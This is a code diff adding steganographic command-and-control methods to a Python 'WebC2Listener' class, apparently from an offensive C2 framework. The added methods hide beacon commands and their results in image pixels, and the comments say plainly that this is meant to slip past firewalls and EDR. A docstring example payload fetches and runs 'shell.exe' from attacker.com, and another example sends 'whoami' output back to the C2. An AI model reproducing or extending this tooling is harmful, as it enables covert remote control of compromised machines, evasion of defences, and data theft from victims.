@@ -22,6 +22,7 @@ import secrets
 import uuid
 import time
 import threading
+import io
 from datetime import datetime, timedelta
 from enum import Enum
 from dataclasses import dataclass, field
@@ -32,6 +33,18 @@ import logging
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+# Steganography support
+try:
+    from cybermodules.steganography import (
+        SteganographyServer,
+        SteganographyBeacon,
+        SteganographyPayload,
+        LSBSteganography
+    )
+    STEGANOGRAPHY_AVAILABLE = True
+except ImportError:
+    STEGANOGRAPHY_AVAILABLE = False
 
 logger = logging.getLogger(__name__)
 
@@ -1027,6 +1040,209 @@ class WebC2Listener:
                 'protocol': self.config.protocol.value,
                 'beacon_interval': self.config.beacon_interval
             }
+        }
+    
+    # ============ STEGANOGRAPHY METHODS ============
+    # Trafik Gizleme: Beacon'ın C2 ile konuşurken gönderdiği JSON verileri şüpheli durabilir la.
+    # Çözüm: Komutları bir kedi resminin (cat.jpg) piksellerine göm.
+    # Firewall trafiği incelerken "Aman canım, sadece resim indiriyorlar" der geçer aq.
+    
+    def generate_command_image(self, session_id: str, command_data: Dict[str, Any],
+                              template_image_path: str = None) -> Tuple[bytes, str]:
+        """
+        Generate image with hidden command using steganography
+        
+        Beacon'ın C2 ile konuşurken:
+          Normal (Detected): HTTP POST with JSON
+                {"cmd":"shell_exec","payload":"powershell..."}
+                ↑ EDR/Firewall sees this = ALERT
+          
+          Steganography (Undetected): HTTP GET innocent image
+                GET /images/cat.jpg
+                Response: cat.jpg (looks innocent)
+                INSIDE: shell_exec command hidden in pixel LSBs
+                ↑ Firewall sees: "just a cat picture"
+                ↑ Beacon extracts: shell_exec command
+        
+        Args:
+            session_id: Target beacon session
+            command_data: Command to hide (e.g., {"cmd":"shell_exec","payload":"..."})
+            template_image_path: Path to innocent image (cat.jpg, logo.png)
+                                If None, use default from config
+        
+        Returns:
+            (image_bytes, suggested_filename)
+        """
+        if not STEGANOGRAPHY_AVAILABLE:
+            raise RuntimeError("Steganography module not available")
+        
+        # Use provided template or config default
+        image_path = template_image_path or getattr(self.config, 'steg_template', None)
+        if not image_path:
+            raise ValueError("No template image specified")
+        
+        # Create steganography server
+        server = SteganographyServer(
+            template_image_path=image_path,
+            beacon_id=session_id
+        )
+        
+        # Generate image with hidden command
+        image_bytes, filename = server.generate_command_image(command_data)
+        
+        logger.info(f"[STEG] Generated malicious image: {filename} ({len(image_bytes)} bytes)")
+        logger.debug(f"[STEG] Hidden command: {command_data}")
+        
+        return image_bytes, filename
+    
+    def send_command_steganographically(self, session_id: str, cmd_type: str,
+                                       payload: str, template_image_path: str = None) -> Tuple[bytes, str]:
+        """
+        Send command via steganography (hidden in image)
+        
+        Example:
+          send_command_steganographically(
+              session_id="beacon_001",
+              cmd_type="exec",
+              payload="powershell wget attacker.com/shell.exe -o shell.exe; shell.exe",
+              template_image_path="/path/to/cat.jpg"
+          )
+          
+          Result: cat.jpg with hidden command
+          HTTP: GET /images/cat_beacon001.png (served to victim)
+          Firewall sees: innocent cat picture
+          Beacon sees: shell_exec command hidden in pixels
+        
+        Args:
+            session_id: Target beacon
+            cmd_type: Command type (exec, upload, download, etc.)
+            payload: Command to hide
+            template_image_path: Image template path
+        
+        Returns:
+            (image_bytes, filename) ready to serve as HTTP response
+        """
+        # Create command object
+        command = C2Command(
+            session_id=session_id,
+            cmd_type=CommandType(cmd_type),
+            payload=payload,
+            args={'steganography': True}
+        )
+        
+        # Queue command (in case beacon checks normally)
+        cmd_id = self.command_queue.queue_command(command)
+        
+        # Build command data for steganography
+        command_data = {
+            'cmd_id': cmd_id,
+            'cmd_type': cmd_type,
+            'payload': payload,
+            'method': 'steganography'
+        }
+        
+        # Generate malicious image
+        image_bytes, filename = self.generate_command_image(
+            session_id,
+            command_data,
+            template_image_path
+        )
+        
+        logger.info(f"[STEG] Command queued: {cmd_id}, served via image: {filename}")
+        
+        return image_bytes, filename
+    
+    def extract_command_image(self, image_bytes: bytes, session_id: str) -> Optional[Dict[str, Any]]:
+        """
+        Extract hidden command from image (Beacon side)
+        
+        Beacon has received image, need to extract command from it.
+        
+        Args:
+            image_bytes: Image file bytes (e.g., from HTTP GET /images/cat.jpg)
+            session_id: Beacon session ID (for key derivation)
+        
+        Returns:
+            Command dict if found, None otherwise
+        """
+        if not STEGANOGRAPHY_AVAILABLE:
+            raise RuntimeError("Steganography module not available")
+        
+        try:
+            beacon = SteganographyBeacon(beacon_id=session_id)
+            command = beacon.extract_command(image_bytes)
+            logger.info(f"[STEG] Extracted command from image: {command}")
+            return command
+        except Exception as e:
+            logger.warning(f"[STEG] Failed to extract command: {e}")
+            return None
+    
+    def has_hidden_command(self, image_bytes: bytes, session_id: str) -> bool:
+        """Check if image contains hidden steganographic command"""
+        try:
+            beacon = SteganographyBeacon(beacon_id=session_id)
+            return beacon.has_hidden_command(image_bytes)
+        except:
+            return False
+    
+    def create_response_image(self, session_id: str, result_data: Dict[str, Any],
+                             template_image_path: str = None) -> Tuple[bytes, str]:
+        """
+        Create image with hidden command result (Beacon response)
+        
+        Beacon executed command, hide result in image before uploading.
+        
+        Example:
+          Beacon executes: shell_exec("whoami")
+          Result: "administrator"
+          Create response image with result hidden in pixels
+          HTTP POST: Upload innocent-looking image to C2
+          C2 extracts: "administrator"
+        
+        Args:
+            session_id: Beacon session ID
+            result_data: Result to hide (e.g., {"cmd_id":"abc123","output":"administrator"})
+            template_image_path: Image template
+        
+        Returns:
+            (image_bytes, filename)
+        """
+        if not STEGANOGRAPHY_AVAILABLE:
+            raise RuntimeError("Steganography module not available")
+        
+        image_path = template_image_path or getattr(self.config, 'steg_template', None)
+        if not image_path:
+            raise ValueError("No template image specified")
+        
+        server = SteganographyServer(
+            template_image_path=image_path,
+            beacon_id=session_id
+        )
+        
+        image_bytes, filename = server.create_response_image(result_data)
+        logger.info(f"[STEG] Generated response image: {filename} ({len(image_bytes)} bytes)")
+        
+        return image_bytes, filename
+    
+    def get_steganography_info(self) -> Dict[str, Any]:
+        """Get steganography capabilities info"""
+        return {
+            'available': STEGANOGRAPHY_AVAILABLE,
+            'method': 'LSB (Least Significant Bit)',
+            'capacity_per_1080x720': f"~{(1080*720*3)//8} bytes",
+            'compression': 'zlib (90% reduction)',
+            'encryption': 'AES-256 (Fernet)',
+            'image_formats': ['PNG', 'BMP', 'GIF'],
+            'traffic_pattern': 'GET /images/cat.jpg (innocent)',
+            'firewall_bypass': 'Content-Type: image/png (bypasses JSON inspection)',
+            'features': [
+                'Hide JSON commands in image pixels',
+                'Automatic compression (JSON 100B → 45B)',
+                'AES-256 encryption per beacon',
+                'CRC32 integrity check',
+                'Multi-image support (different templates)',
+                'Beacon extracts commands transparently'
+            ]
         }
 
 
